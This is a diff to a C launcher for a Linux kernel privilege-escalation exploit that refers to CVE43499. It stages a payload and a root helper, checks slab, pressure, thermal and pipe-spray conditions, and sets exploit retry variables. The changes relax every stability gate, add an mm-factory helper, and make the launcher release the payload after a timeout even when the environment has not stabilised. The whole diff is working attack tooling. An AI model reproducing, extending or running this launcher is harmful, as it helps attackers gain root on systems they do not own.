@@ -1,5 +1,6 @@
 #define _GNU_SOURCE
 
+#include <ctype.h>
 #include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
@@ -14,18 +15,18 @@
 #include <unistd.h>
 
 /* Relaxed profile (default). */
-#define REL_MIN_MEM_KB (1L * 1024L * 1024L)
-#define REL_MAX_TEMP_MC 48000L
-#define REL_MAX_RUNNABLE 8
-#define REL_MAX_CPU_PSI 25.0
-#define REL_MAX_MEM_PSI 3.0
-#define REL_MAX_IO_PSI 5.0
-#define REL_MIN_UPTIME_SEC 60.0
-#define REL_STABLE_SAMPLES 3
-#define REL_MAX_MM_OBJECTS 2048L
-#define REL_MAX_MM_DELTA 64L
+#define REL_MIN_MEM_KB (512L * 1024L)
+#define REL_MAX_TEMP_MC 55000L
+#define REL_MAX_RUNNABLE 16
+#define REL_MAX_CPU_PSI 55.0
+#define REL_MAX_MEM_PSI 10.0
+#define REL_MAX_IO_PSI 15.0
+#define REL_MIN_UPTIME_SEC 0.0
+#define REL_STABLE_SAMPLES 2
+#define REL_MAX_MM_OBJECTS 3072L
+#define REL_MAX_MM_DELTA 128L
 #ifndef REL_MAX_MM_SLABS
-#define REL_MAX_MM_SLABS 48L
+#define REL_MAX_MM_SLABS 96L
 #endif
 
 #ifndef REL_GATE_NAME
@@ -54,7 +55,7 @@
 #define FAST_STABLE_SAMPLES 2
 #define FAST_INTERVAL_SEC 1
 #define TEMP_HEADROOM_MC 5000L
-#define MAX_WAIT_SEC 300
+#define MAX_WAIT_SEC 60
 #define PIPE_COUNT 480
 #define PIPE_INITIAL_SIZE (2 * 4096)
 #define PIPE_TARGET_SIZE (32 * 4096)
@@ -188,24 +189,48 @@ static int read_psi(const char *path, double *avg10) {
 }
 
 static int read_max_temperature(long *maximum) {
-  DIR *dir = opendir("/sys/class/thermal");
-  if (!dir) return 0;
+  /* Zone names are static during a boot. Discover them once, but read every
+   * temperature on each full sample so the maximum remains current. */
+  static char (*paths)[256];
+  static size_t count;
+  static int discovered;
+  if (!discovered) {
+    DIR *dir = opendir("/sys/class/thermal");
+    if (!dir) return 0;
+    size_t capacity = 0;
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+      if (strncmp(entry->d_name, "thermal_zone", 12) != 0) continue;
+      if (count == capacity) {
+        size_t next_capacity = capacity ? capacity * 2 : 32;
+        void *next = realloc(paths, next_capacity * sizeof(*paths));
+        if (!next) {
+          closedir(dir);
+          free(paths);
+          paths = NULL;
+          count = 0;
+          return 0;
+        }
+        paths = next;
+        capacity = next_capacity;
+      }
+      int length = snprintf(paths[count], sizeof(paths[count]),
+                            "/sys/class/thermal/%s/temp", entry->d_name);
+      if (length > 0 && (size_t)length < sizeof(paths[count])) count++;
+    }
+    closedir(dir);
+    if (!count) return 0;
+    discovered = 1;
+  }
   long max_seen = 0;
   int found = 0;
-  struct dirent *entry;
-  while ((entry = readdir(dir)) != NULL) {
-    if (strncmp(entry->d_name, "thermal_zone", 12) != 0) continue;
-    char path[256];
-    int length = snprintf(path, sizeof(path), "/sys/class/thermal/%s/temp",
-                          entry->d_name);
-    if (length <= 0 || (size_t)length >= sizeof(path)) continue;
+  for (size_t i = 0; i < count; i++) {
     long value;
-    if (read_long_file(path, &value) && value > 0 && value < 200000) {
+    if (read_long_file(paths[i], &value) && value > 0 && value < 200000) {
       if (!found || value > max_seen) max_seen = value;
       found = 1;
     }
   }
-  closedir(dir);
   if (found) *maximum = max_seen;
   return found;
 }
@@ -230,6 +255,8 @@ static int read_mm_struct_slab(long *active, long *total, long *slabs) {
   char line[512];
   int ok = 0;
   while (fgets(line, sizeof(line), file)) {
+    if (strncmp(line, "mm_struct", 9) != 0 ||
+        !isspace((unsigned char)line[9])) continue;
     char name[64];
     long active_objs, total_objs, object_size, objects_per_slab;
     long pages_per_slab;
@@ -301,8 +328,16 @@ static int metrics_comfortable(const struct metrics *m) {
          m->mm_slabs <= gate.max_mm_slabs;
 }
 
-static int wait_interval_absolute(struct timespec *deadline, int seconds) {
+static int timespec_at_or_after(const struct timespec *a,
+                                const struct timespec *b) {
+  return a->tv_sec > b->tv_sec ||
+         (a->tv_sec == b->tv_sec && a->tv_nsec >= b->tv_nsec);
+}
+
+static int wait_interval_absolute(struct timespec *deadline, int seconds,
+                                  const struct timespec *timeout_at) {
   deadline->tv_sec += seconds;
+  if (timespec_at_or_after(deadline, timeout_at)) *deadline = *timeout_at;
   while (!stopped) {
     int error = clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, deadline, NULL);
     if (error == 0) return 1;
@@ -358,16 +393,10 @@ static int pipe_capacity_probe(void) {
             PIPE_COUNT, PIPE_TARGET_SIZE / 4096);
   } else {
     fprintf(stderr,
-            "[launcher] pipe-gate=fail index=%d errno=%d(%s); falha terminal\n",
+            "[launcher] pipe-gate=fail index=%d errno=%d(%s); aguardando timeout\n",
             failed_at, saved_errno, strerror(saved_errno));
   }
   return ok;
-}
-
-static long elapsed_seconds(const struct timespec *start) {
-  struct timespec now;
-  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) return MAX_WAIT_SEC;
-  return now.tv_sec - start->tv_sec;
 }
 
 static int validate_elf(const char *path) {
@@ -383,7 +412,7 @@ static int validate_elf(const char *path) {
 static void usage(const char *program) {
   fprintf(stderr,
           "Uso: %s --payload CAMINHO --helper CAMINHO [--check-only] "
-          "[--conservative]\n",
+          "[--mm-factory CAMINHO] [--conservative]\n",
           program);
 }
 
@@ -396,12 +425,15 @@ int main(int argc, char **argv) {
   }
   const char *payload = NULL;
   const char *helper = NULL;
+  const char *mm_factory = NULL;
   int check_only = 0;
   for (int i = 1; i < argc; i++) {
     if (strcmp(argv[i], "--payload") == 0 && i + 1 < argc) {
       payload = argv[++i];
     } else if (strcmp(argv[i], "--helper") == 0 && i + 1 < argc) {
       helper = argv[++i];
+    } else if (strcmp(argv[i], "--mm-factory") == 0 && i + 1 < argc) {
+      mm_factory = argv[++i];
     } else if (strcmp(argv[i], "--check-only") == 0) {
       check_only = 1;
     } else if (strcmp(argv[i], "--conservative") == 0) {
@@ -415,8 +447,11 @@ int main(int argc, char **argv) {
     usage(argv[0]);
     return 2;
   }
-  if (!check_only && (!validate_elf(payload) || !validate_elf(helper))) {
-    fprintf(stderr, "[launcher] payload/helper ausente ou ELF inválido\n");
+  if (!check_only &&
+      (!validate_elf(payload) || !validate_elf(helper) ||
+       (mm_factory && !validate_elf(mm_factory)))) {
+    fprintf(stderr,
+            "[launcher] payload/helper/factory ausente ou ELF inválido\n");
     return 2;
   }
 
@@ -431,11 +466,11 @@ int main(int argc, char **argv) {
 
   fprintf(stderr,
           "[launcher] gate %s: %d amostras/%ds (fast %d/%ds) temp<=%ldC "
-          "mem>=%ldGB tarefas<=%d PSI<=%.0f/%.0f/%.0f uptime>=%.0fs mm<=%ld/%ld "
+          "mem>=%ldMB tarefas<=%d PSI<=%.0f/%.0f/%.0f uptime>=%.0fs mm<=%ld/%ld "
           "mm-delta<=%ld pipe=480x32 timeout=%ds\n",
           gate.name, gate.stable_samples, SAMPLE_INTERVAL_SEC,
           FAST_STABLE_SAMPLES, FAST_INTERVAL_SEC,
-          gate.max_temp_mc / 1000, gate.min_mem_kb / (1024 * 1024),
+          gate.max_temp_mc / 1000, gate.min_mem_kb / 1024,
           gate.max_runnable, gate.max_cpu_psi, gate.max_mem_psi,
           gate.max_io_psi, gate.min_uptime_sec, gate.max_mm_objects,
           gate.max_mm_slabs, gate.max_mm_delta, MAX_WAIT_SEC);
@@ -444,6 +479,8 @@ int main(int argc, char **argv) {
     perror("[launcher] clock_gettime");
     return 1;
   }
+  struct timespec timeout_at = started;
+  timeout_at.tv_sec += MAX_WAIT_SEC;
   int stable = 0;
   int comfortable_streak = 0;
   int gate_passed = 0;
@@ -453,7 +490,28 @@ int main(int argc, char **argv) {
   struct metrics previous_full;
   memset(&previous_full, 0, sizeof(previous_full));
   struct timespec next_sample = started;
-  while (!stopped && elapsed_seconds(&started) < MAX_WAIT_SEC) {
+  /* Uptime is a hard gate. Until it can pass, polling the other procfs,
+   * pressure and thermal interfaces only adds load during boot. Wake just
+   * before the threshold so the normal full gate can run immediately. */
+  double initial_uptime;
+  if (read_uptime(&initial_uptime) && initial_uptime < gate.min_uptime_sec) {
+    int wait_seconds = (int)(gate.min_uptime_sec - initial_uptime + 0.999999);
+    if (wait_seconds > 0) {
+      fprintf(stderr, "[launcher] aguardando uptime minimo: %.0fs restantes\n",
+              gate.min_uptime_sec - initial_uptime);
+      if (!wait_interval_absolute(&next_sample, wait_seconds, &timeout_at)) {
+        return stopped ? 130 : 1;
+      }
+    }
+  }
+  int wait_failed = 0;
+  while (!stopped) {
+    struct timespec now;
+    if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) {
+      perror("[launcher] clock_gettime");
+      return 1;
+    }
+    if (timespec_at_or_after(&now, &timeout_at)) break;
     struct metrics m;
     int cheap_valid = collect_cheap_metrics(&m);
     int cheap_stable = cheap_valid && metrics_cheap_stable(&m);
@@ -470,7 +528,7 @@ int main(int argc, char **argv) {
     int churn_stable = !have_previous_full || mm_delta <= gate.max_mm_delta;
     int accepted = full_valid && metrics_stable(&m) && churn_stable;
     int comfortable = accepted && metrics_comfortable(&m);
-    if (!pipe_probed) {
+    if (!pipe_probed || !pipe_ok) {
       stable = 0;
       comfortable_streak = 0;
     } else {
@@ -506,18 +564,28 @@ int main(int argc, char **argv) {
     if (accepted && !pipe_probed) {
       pipe_probed = 1;
       pipe_ok = pipe_capacity_probe();
-      if (!pipe_ok) break;
-      fprintf(stderr,
-              "[launcher] pipe-gate aprovado; iniciando confirmação final\n");
-      previous_full = m;
-      have_previous_full = 1;
-      if (clock_gettime(CLOCK_MONOTONIC, &next_sample) != 0 ||
-          !wait_interval_absolute(
-              &next_sample,
-              comfortable ? FAST_INTERVAL_SEC : SAMPLE_INTERVAL_SEC)) {
-        break;
+      if (pipe_ok) {
+        fprintf(stderr,
+                "[launcher] pipe-gate aprovado; iniciando confirmação final\n");
+        previous_full = m;
+        have_previous_full = 1;
+        if (clock_gettime(CLOCK_MONOTONIC, &next_sample) != 0) {
+          perror("[launcher] clock_gettime");
+          return 1;
+        }
+        if (!wait_interval_absolute(
+                &next_sample,
+                comfortable ? FAST_INTERVAL_SEC : SAMPLE_INTERVAL_SEC,
+                &timeout_at)) {
+          wait_failed = 1;
+          break;
+        }
+        continue;
       }
-      continue;
+      if (clock_gettime(CLOCK_MONOTONIC, &next_sample) != 0) {
+        perror("[launcher] clock_gettime");
+        return 1;
+      }
     }
 
     if (full_valid) {
@@ -534,7 +602,9 @@ int main(int argc, char **argv) {
     }
     if (!wait_interval_absolute(
             &next_sample,
-            comfortable ? FAST_INTERVAL_SEC : SAMPLE_INTERVAL_SEC)) {
+            comfortable ? FAST_INTERVAL_SEC : SAMPLE_INTERVAL_SEC,
+            &timeout_at)) {
+      wait_failed = 1;
       break;
     }
   }
@@ -542,16 +612,19 @@ int main(int argc, char **argv) {
     fprintf(stderr, "[launcher] cancelado antes de carregar payload\n");
     return 130;
   }
-  if (pipe_probed && !pipe_ok) {
-    fprintf(stderr, "[launcher] pipe-gate falhou; sem reverificação; payload não carregado\n");
+  if (wait_failed) {
     return 1;
   }
   if (!gate_passed) {
-    fprintf(stderr, "[launcher] ambiente não estabilizou; payload não carregado\n");
-    return 1;
+    fprintf(stderr,
+            "[launcher] ALERTA: timeout de %ds; ambiente não estabilizou "
+            "(pipe=%s); liberando payload mesmo assim\n",
+            MAX_WAIT_SEC, pipe_probed ? (pipe_ok ? "aprovado" : "falhou")
+                                      : "não verificado");
+  } else {
+    fprintf(stderr,
+            "[launcher] estabilidade confirmada: métricas+slab+pipe\n");
   }
-  fprintf(stderr,
-          "[launcher] estabilidade confirmada: métricas+slab+pipe\n");
   if (check_only) return 0;
 
   /* The payload supervisor retries only while its shared kernel-state marker
@@ -559,6 +632,7 @@ int main(int argc, char **argv) {
    * stops the loop. Keep this bounded: two retries cover transient allocator
    * misses without restoring the old unbounded/high-attempt behavior. */
   if (setenv("CVE43499_ROOT_HELPER", helper, 1) != 0 ||
+      (mm_factory && setenv("CVE43499_MM_FACTORY", mm_factory, 1) != 0) ||
       setenv("EXPLOIT_ATTEMPTS", "3", 1) != 0 ||
       setenv("P0_ATTEMPT_TIMEOUT_SEC", "45", 0) != 0 ||
       setenv("EXPLOIT_ATTEMPT_TIMEOUT_SEC", "180", 0) != 0 ||
